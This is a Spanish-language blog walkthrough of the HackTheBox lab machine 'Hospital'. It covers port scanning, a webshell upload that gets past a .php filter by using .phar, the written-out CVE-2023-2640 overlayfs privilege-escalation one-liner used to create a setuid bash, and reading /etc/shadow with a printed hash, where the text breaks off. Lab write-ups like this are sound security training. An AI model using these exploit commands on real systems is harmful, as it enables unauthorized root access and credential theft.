<!doctype html><html lang=es><head><title>HTB Hospital WriteUp · gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackTheBox 'Hospital' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Hospital WriteUp"><meta name=twitter:description content="HackTheBox 'Hospital' WriteUp"><meta property="og:title" content="HTB Hospital WriteUp"><meta property="og:description" content="HackTheBox 'Hospital' WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/hospital/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-04-13T00:00:00+00:00"><meta property="article:modified_time" content="2024-04-13T00:00:00+00:00"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/hospital/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/hospital/>🇬🇧</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/hospital/>HTB Hospital WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-04-13T00:00:00Z>13 abril, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
15 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/windows/>Windows</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/medium/>Medium</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/pivoting/>Pivoting</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/evil-winrm/>Evil-Winrm</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/powershell/>Powershell</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/file-upload/>File Upload</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/php/>Php</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/ghostscript/>Ghostscript</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/john/>John</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/netexec/>Netexec</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/crackmapexec/>Crackmapexec</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/es/tags/netcat/>Netcat</a></span></div></div></header><div class=post-content><hr><h1 id=hospital----hackthebox>Hospital &ndash; HackTheBox
<a class=heading-link href=#hospital----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty/Dificultad: <em>Medium</em> / <em>Media</em></li><li>Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Hospital&rsquo; Avatar" src=/pentesting/images/Hospital_avatar.png></p><hr><h2 id=usuario>Usuario
<a class=heading-link href=#usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Empezamos con un escaneo con <code>Nmap</code>, donde vemos bastantes puertos abiertos. Vemos 2 puertos abiertos interesantes: <code>443</code> <code>HTTPs</code> y <code>8080</code>. Además, dado que veo los puertos <code>53</code> <code>Domain Name System</code>, <code>88</code> <code>Kerberos</code>, <code>135</code> <code>Microsoft RPC</code> y <code>389</code> <code>LDAP</code> sospecho que estamos ante un entorno <code>Active Directory</code> (que, luego veremos, es así, pero no es el tema principal de la máquina).</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>#</span> Nmap 7.94SVN scan initiated Fri Jan  <span class=m>5</span> 19:58:45 <span class=m>2024</span> as: nmap -sVC -p53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6616,6635,9389 -oN targeted 10.10.11.241
</span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.241
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.22s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE           VERSION
</span></span></span><span class=line><span class=cl><span class=go>53/tcp   open  domain            Simple DNS Plus
</span></span></span><span class=line><span class=cl><span class=go>88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-01-06 05:58:59Z)
</span></span></span><span class=line><span class=cl><span class=go>135/tcp  open  msrpc             Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
</span></span></span><span class=line><span class=cl><span class=go>389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-09-06T10:49:03
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2028-09-06T10:49:03
</span></span></span><span class=line><span class=cl><span class=go>443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
</span></span></span><span class=line><span class=cl><span class=go>| tls-alpn: 
</span></span></span><span class=line><span class=cl><span class=go>|_  http/1.1
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=localhost
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2009-11-10T23:48:47
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2019-11-08T23:48:47
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>445/tcp  open  microsoft-ds?
</span></span></span><span class=line><span class=cl><span class=go>464/tcp  open  kpasswd5?
</span></span></span><span class=line><span class=cl><span class=go>593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>636/tcp  open  ldapssl?
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-09-06T10:49:03
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2028-09-06T10:49:03
</span></span></span><span class=line><span class=cl><span class=go>1801/tcp open  msmq?
</span></span></span><span class=line><span class=cl><span class=go>2103/tcp open  msrpc             Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>2105/tcp open  msrpc             Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>2107/tcp open  msrpc             Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>2179/tcp open  vmrdp?
</span></span></span><span class=line><span class=cl><span class=go>3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-09-06T10:49:03
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2028-09-06T10:49:03
</span></span></span><span class=line><span class=cl><span class=go>3269/tcp open  globalcatLDAPssl?
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-09-06T10:49:03
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2028-09-06T10:49:03
</span></span></span><span class=line><span class=cl><span class=go>3389/tcp open  ms-wbt-server     Microsoft Terminal Services
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC.hospital.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-09-05T18:39:34
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-03-06T18:39:34
</span></span></span><span class=line><span class=cl><span class=go>| rdp-ntlm-info: 
</span></span></span><span class=line><span class=cl><span class=go>|   Target_Name: HOSPITAL
</span></span></span><span class=line><span class=cl><span class=go>|   NetBIOS_Domain_Name: HOSPITAL
</span></span></span><span class=line><span class=cl><span class=go>|   NetBIOS_Computer_Name: DC
</span></span></span><span class=line><span class=cl><span class=go>|   DNS_Domain_Name: hospital.htb
</span></span></span><span class=line><span class=cl><span class=go>|   DNS_Computer_Name: DC.hospital.htb
</span></span></span><span class=line><span class=cl><span class=go>|   DNS_Tree_Name: hospital.htb
</span></span></span><span class=line><span class=cl><span class=go>|   Product_Version: 10.0.17763
</span></span></span><span class=line><span class=cl><span class=go>|_  System_Time: 2024-01-06T05:59:58+00:00
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>6404/tcp open  msrpc             Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>6407/tcp open  msrpc             Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>6409/tcp open  msrpc             Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>6616/tcp open  msrpc             Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>6635/tcp open  msrpc             Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>9389/tcp open  mc-nmf            .NET Message Framing
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode: 
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1: 
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled and required
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time: 
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-01-06T06:00:02
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go>|_clock-skew: mean: 7h00m05s, deviation: 0s, median: 7h00m04s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>#</span> Nmap <span class=k>done</span> at Fri Jan  <span class=m>5</span> 20:00:36 <span class=m>2024</span> -- <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 110.20 seconds
</span></span></code></pre></div><ul><li>La página <code>HTTPs</code> (<code>https://10.10.11.121/</code>) muestra un panel de login:</li></ul><p><img alt="&lsquo;Hospital&rsquo; Panel 1" src=/pentesting/images/Hospital_7.png></p><p>pero no hay nada interesante aquí de momento. De todas formas, recordaré este sitio para después.</p><ul><li>La página <code>HTTP</code> corriendo en el puerto <code>8080</code> se ve como otro simple panel de login:</li></ul><p><img alt="&lsquo;Hospital&rsquo; Panel 2" src=/pentesting/images/Hospital_1.png></p><ul><li>No obstante, esta página deja crearnos un usuario. De manera que creamos uno.</li><li>Una vez hayamos creado el usuario y nos logueemos con nuestras credenciales podemos ver un mensaje al entrar <code>In order to get more personalized treatment, please upload your medical records</code>, donde nos permite subir un archivo:</li></ul><p><img alt="Upload file 1" src=/pentesting/images/Hospital_2.png></p><ul><li>Dado que podemos subir un archivo, trataré de performar un <code>File Upload Attack</code> (subir un archivo malicioso). Podemos intentar, por ejemplo, subir una <a href=https://github.com/flozz/p0wny-shell class=external-link target=_blank rel=noopener>powny-shell</a> dado que veo que la página web de login actual es <code>index.php</code> (de manera que, asumo, el sitio usa <code>PHP</code> para funcionar)</li><li>Cuando intento subir esta shell, la cual nombré <code>pwnshell.php</code>, obtengo un error:</li></ul><p><img alt="Upload shell fails" src=/pentesting/images/Hospital_3.png></p><ul><li><p>Luego de algunos intentos me doy cuenta que la extensión <code>.php</code> no sirve para subir archivos, pero la extensión <code>.phar</code> sí que se puede. De manera que subimos un archivo llamado <code>pwnshell.phar</code> (simplemente renombre, en nuestro caso, la shell <code>pwnshell.php</code> a <code>pwnshell.phar</code>) y esta vez nos permite subir el archivo malicioso/webshell sin ningún problema al servidor víctima:
<img alt="Upload shell works" src=/pentesting/images/Hospital_4.png></p></li><li><p>Ahora bien, de alguna manera necesito &ldquo;llegar&rdquo; al archivo malicioso que acabo de subir. Para esto intento un <code>Brute Force Directory Listing</code> usando <code>Gobuster</code> en el puerto <code>8080</code>. Esto revela un directorio <code>/uploads</code>.</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.241:8080 -x php -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://10.10.11.241:8080
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/login.php            (Status: 200) [Size: 5739]
</span></span></span><span class=line><span class=cl><span class=go>/register.php         (Status: 200) [Size: 5125]
</span></span></span><span class=line><span class=cl><span class=go>/uploads              (Status: 301) [Size: 321] [--&gt; http://10.10.11.241:8080/uploads/]
</span></span></span><span class=line><span class=cl><span class=go>/.php                 (Status: 403) [Size: 279]
</span></span></span><span class=line><span class=cl><span class=go>/index.php            (Status: 302) [Size: 0] [--&gt; login.php]
</span></span></span><span class=line><span class=cl><span class=go>/images               (Status: 301) [Size: 320] [--&gt; http://10.10.11.241:8080/images/]
</span></span></span><span class=line><span class=cl><span class=go>/upload.php           (Status: 200) [Size: 0]
</span></span></span><span class=line><span class=cl><span class=go>/css                  (Status: 301) [Size: 317] [--&gt; http://10.10.11.241:8080/css/]
</span></span></span><span class=line><span class=cl><span class=go>/js                   (Status: 301) [Size: 316] [--&gt; http://10.10.11.241:8080/js/]
</span></span></span><span class=line><span class=cl><span class=go>/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]
</span></span></span><span class=line><span class=cl><span class=go>/success.php          (Status: 200) [Size: 3536]
</span></span></span><span class=line><span class=cl><span class=go>/vendor               (Status: 301) [Size: 320] [--&gt; http://10.10.11.241:8080/vendor/]
</span></span></span><span class=line><span class=cl><span class=go>/config.php           (Status: 200) [Size: 0]
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>De manera que chequeamos <code>http://hospital.htb:8080/uploads/pwnshell.phar</code> y nuestra shell nos da una cálida bienvenida:
<img alt="Checking upload webshell" src=/pentesting/images/Hospital_5.png>
Pero lo que llama mi atención es que puedo ejecutar comandos de <code>Linux</code> dentro de esta máquina, cuando basado en su <code>TTL</code> cuando usamos <code>ping</code> en la máquina víctima se suponía que ésta estaba corriendo en <code>Windows</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ ping -c1 10.10.11.241
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PING 10.10.11.241 (10.10.11.241) 56(84) bytes of data.
</span></span></span><span class=line><span class=cl><span class=go>64 bytes from 10.10.11.241: icmp_seq=1 ttl=127 time=151 ms
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--- 10.10.11.241 ping statistics ---
</span></span></span><span class=line><span class=cl><span class=go>1 packets transmitted, 1 received, 0% packet loss, time 0ms
</span></span></span><span class=line><span class=cl><span class=go>rtt min/avg/max/mdev = 150.647/150.647/150.647/0.000 ms 
</span></span></span></code></pre></div><p>dado que <code>ttl=127</code>, si no ha sido manipulado, puede indicar que estamos ante una máquina <code>Windows</code> OS.</p><ul><li>Por esto, y tal cual puede ser apreciado en la figura superior, decido utilizar el comando <code>ifconfig</code> y noto que la IPv4 de esta máquina es <code>192.168.5.2</code>, la cual es diferente de la IPv4 (<code>10.10.11.241</code>) que corre el servidor. Esto podría indicar que estamos dentro de una máquina virtual o algo similar.</li><li>Personalmente, prefiero una reverse shell a una webshell. De manera que empiezo un listener con <code>nc</code> en el puerto <code>443</code>, me lanzo una reverse shell con la <code>powny-shell</code> y estamos dentro de nuevo:</li></ul><p><img alt="Webshell to revshell" src=/pentesting/images/Hospital_6.png></p><ul><li>Si chequeamos la version del sistema, estamos dentro de un sistema operativo <code>Ubuntu</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@webserver:/var/www/html/uploads$ cat /etc/os-release
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRETTY_NAME=&#34;Ubuntu 23.04&#34;
</span></span></span><span class=line><span class=cl><span class=go>NAME=&#34;Ubuntu&#34;
</span></span></span><span class=line><span class=cl><span class=go>VERSION_ID=&#34;23.04&#34;
</span></span></span><span class=line><span class=cl><span class=go>VERSION=&#34;23.04 (Lunar Lobster)&#34;
</span></span></span><span class=line><span class=cl><span class=go>VERSION_CODENAME=lunar
</span></span></span><span class=line><span class=cl><span class=go>ID=ubuntu
</span></span></span><span class=line><span class=cl><span class=go>ID_LIKE=debian
</span></span></span><span class=line><span class=cl><span class=go>HOME_URL=&#34;https://www.ubuntu.com/&#34;
</span></span></span><span class=line><span class=cl><span class=go>SUPPORT_URL=&#34;https://help.ubuntu.com/&#34;
</span></span></span><span class=line><span class=cl><span class=go>BUG_REPORT_URL=&#34;https://bugs.launchpad.net/ubuntu/&#34;
</span></span></span><span class=line><span class=cl><span class=go>PRIVACY_POLICY_URL=&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;
</span></span></span><span class=line><span class=cl><span class=go>UBUNTU_CODENAME=lunar
</span></span></span><span class=line><span class=cl><span class=go>LOGO=ubuntu-logo
</span></span></span></code></pre></div><ul><li>Buscando información acerca de esta versión, encuentro <a href=https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/ class=external-link target=_blank rel=noopener>este post</a> el cual da más detalles de esta versión vulnerable, de manera que podemos intentar un <code>Privilege Escalation</code> en este sistema. El &ldquo;proof of concept&rdquo; que se da es el siguiente:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>#</span> original poc payload
</span></span><span class=line><span class=cl><span class=go>unshare -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;
</span></span></span><span class=line><span class=cl><span class=go>setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&#34; &amp;&amp; u/python3 -c &#39;import os;os.setuid(0);os.system(&#34;id&#34;)&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> adjusted poc payload by twitter user<span class=p>;</span> likely <span class=nb>false</span> positive
</span></span><span class=line><span class=cl><span class=go>unshare -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;
</span></span></span><span class=line><span class=cl><span class=go>setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; u/python3 -c &#39;import os;os.setuid(0);os.system(\&#34;id\&#34;)&#39;&#34;
</span></span></span></code></pre></div><ul><li>Por lo tanto, testamos el comando dado (<em>Nota</em>: el sistema debe tener instalado <code>python3</code>, el cual podemos chequear que sí está instalado en la máquina con el comando <code>which python3</code>) y correr:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>unshare -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;
</span></span></span><span class=line><span class=cl><span class=go>setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&#34; &amp;&amp; u/python3 -c &#39;import os; os.setuid(0); os.system(&#34;id&#34;)&#39;
</span></span></span></code></pre></div><ul><li>Pero en mi caso cambio el comando <code>id</code> por el comando <code>cp $(which bash) /tmp/gunzf0x ; chmod 4777 /tmp/gunzf0x</code>. Personalmente prefiero crear una copia del binario <code>/bin/bash</code> y, a esa copia, asignarle el permiso <code>4777</code>, el cual puede ser usado para correr con derechos del propietario y, por tanto, convertirnos en <code>root</code> (pero esto sólo en el sistema/máquina virtual <code>Ubuntu</code>)</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c &#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span> setcap cap_setuid+eip l/python3<span class=p>;</span> mount -t overlay overlay -o rw,lowerdir<span class=o>=</span>l,upperdir<span class=o>=</span>u,workdir<span class=o>=</span>w m <span class=o>&amp;&amp;</span> touch m/*<span class=p>;</span><span class=s2>&#34; &amp;&amp; u/python3 -c &#39;import os; os.setuid(0); os.system(&#34;</span>cp <span class=k>$(</span>which bash<span class=k>)</span> /tmp/gunzf0x <span class=p>;</span> chmod <span class=m>4777</span> /tmp/gunzf0x<span class=s2>&#34;)&#39;
</span></span></span></code></pre></div><p>y, como podemos ver, se ha creado un archivo en el directorio <code>/tmp</code> el cual puede ser abusado para convertirnos en <code>root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@webserver:/var/www/html/uploads$ ls -la /tmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 1416
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root        4096 Apr 13 12:35 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 19 root root        4096 Sep 12  2023 ..
</span></span></span><span class=line><span class=cl><span class=go>-rwsrwxrwx  1 root www-data 1437832 Apr 13 12:35 gunzf0x
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>www-data@webserver:/var/www/html/uploads$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>gunzf0x-5.2# whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><ul><li>Dado que no encuentro variables de entorno <code>.env</code> o keys que podrían contener potenciales credenciales, es que decido revisar el archivo <code>/etc/shadow</code>, donde el sistema guarda las contraseñas:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>gunzf0x-5.2# cat /etc/shadow
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>daemon:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>bin:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>sys:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>sync:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>games:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>man:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>lp:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>mail:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>news:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>uucp:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>proxy:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>www-data:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>backup:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>list:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>irc:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>_apt:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>nobody:*:19462:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>systemd-network:!*:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>systemd-timesync:!*:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>messagebus:!:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>systemd-resolve:!*:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>pollinate:!:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>sshd:!:19462::::::
